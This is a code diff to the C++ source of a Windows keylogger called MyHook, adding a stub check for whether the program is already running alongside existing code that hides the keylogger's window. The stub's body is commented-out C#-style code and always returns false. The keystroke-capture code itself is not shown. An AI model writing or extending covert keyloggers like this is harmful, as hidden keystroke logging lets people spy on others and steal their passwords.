@@ -38,6 +38,7 @@
 #include <cstdlib>
 #include <windows.h>
 #include <time.h>
+#include <string>
 #include "DataLog.h"
 #include "KeyLogger.h"
 
@@ -58,11 +59,16 @@ const bool HIDDEN = false;
   */
 const LogTypeName LOG_MODE = DEBUG;
 
-void hideMe(void);
+bool myHookIsRunning();
+void hideMe();
 void startLog(DataLog datalog);
 
 int main (void)
 {
+    // Make sure process is not already running
+    if (myHookIsRunning())
+       return EXIT_FAILURE;
+    
     // Check if we need to hide the window
     if (HIDDEN)
        hideMe();
@@ -82,6 +88,26 @@ int main (void)
     return EXIT_SUCCESS;
 }
 
+/**
+  * Method to check whether MyHook is already running
+  */
+bool myHookIsRunning()
+{
+     /*
+     // get the name of our process
+     string proc = Process.GetCurrentProcess().ProcessName;
+
+     // get the list of all processes by that name
+     Process[] processes = Process.GetProcessesByName(proc);
+     
+    // if there is more than one process...
+    if (processes.Length > 1)
+        return true;
+    else
+        return false;*/
+        
+    return false;
+}
 /**
   * Method to hide the keylogger window
   */
